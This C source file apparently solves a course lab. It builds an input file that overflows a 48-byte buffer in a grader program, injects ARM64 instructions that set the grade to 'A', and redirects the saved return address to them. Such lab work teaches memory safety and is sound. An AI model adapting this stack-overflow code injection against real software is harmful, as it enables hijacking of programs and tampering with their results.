/*-------------------------------------------------------------------- *
 * createdataA.c  
 Author: Zara Hommez                                                   *
 * Purpose: To produce a file named dataA that will earn an A grade.   *
 * This program exploits a buffer overflow in the readString function  *
 * to overwrite the return address. The attack writes the user's name  *
 * followed by machine code instructions that set the grade to 'A' and *
 * branch back to main. These instructions are written to the buffer,  *
 * which gets copied to BSS. The return address is overwritten to point*
 * to where the instructions will be located in BSS after the copy.    *
 *--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/*
 * main: Generates a data file that will cause the grader program to  
 * Output the user's name and give an A grade
 * No command line arguements, no reading from stdin. 
 * writes to file dataA the name, null byte, instructions to set grade to A,
 * padding to overflow buffer, and overwrites stored x30 to point to the
 * instructions in BSS.
 * Returns EXIT_FAILURE if unable to allocate memory or failing to open file
 * Return EXIT_SUCCESS on successfully making dataA
 */
int main() {
    FILE *pFileA;
    unsigned int instruction;

    /* Student name to write to file */
    char name[] = "Zara Hommez\0";
    /* Name string length + null byte: 12 bytes */
    /* already 4-byte aligned*/
    size_t nameLen = strlen(name)+1;  
    /* Buffer is 48 bytes (BUFSIZE) */
    size_t bufLen = 48;
    /* Padding to fill the rest of the buffer after instructions */
    size_t paddingLen = bufLen - (nameLen+ 16);
    char* padding;
    /*start of name[0] shifted by 12 for the name chars aka &name[12] */ 
    unsigned long instructnameBSS = 0x420064;


    pFileA = fopen("dataA", "wb");
    if (pFileA == NULL) {
        perror("Failed to open dataA");
        return EXIT_FAILURE;
    }
    
    /* Write name + null byte to file */
    fwrite(name, 1, nameLen, pFileA);

    /* adr x0, 0x420044 (address of grade variable ) */
   instruction = MiniAssembler_adr(0, 0x420044, instructnameBSS);
   fwrite(&instruction, sizeof(instruction), 1, pFileA);

   
    /* mov w1, 'A' */
    instruction = MiniAssembler_mov(1, 'A');
    fwrite(&instruction, sizeof(instruction), 1, pFileA);

    
    /* strb w1, [x0] */
    /* stores the byte in w1 to the address in x0 (grade variable) */
    instruction = MiniAssembler_strb(1, 0);
    fwrite(&instruction, sizeof(instruction), 1, pFileA);

    
    /* b 0x40089c (back to main, right before printf) */
    instruction = MiniAssembler_b(0x40089c, instructnameBSS + 12);
    fwrite(&instruction, sizeof(instruction), 1, pFileA);

    /* Add padding bytes to fill the remaining buffer space */
    padding = (char *)calloc(paddingLen, 1);
    if (padding == NULL)
    {
       perror("Memory allocation failed");
       fclose(pFileA);
       return EXIT_FAILURE;
    }
    /* fill padding with P bytes for visibility */
    memset(padding, 'P', paddingLen);
    fwrite(padding, 1, paddingLen, pFileA);
    free(padding);

    /* Write address of instructions in BSS to overwrite x30 */
    fwrite(&instructnameBSS, sizeof(unsigned long), 1, pFileA);

    /*Close file */
    fclose(pFileA);
    return EXIT_SUCCESS;
} 
















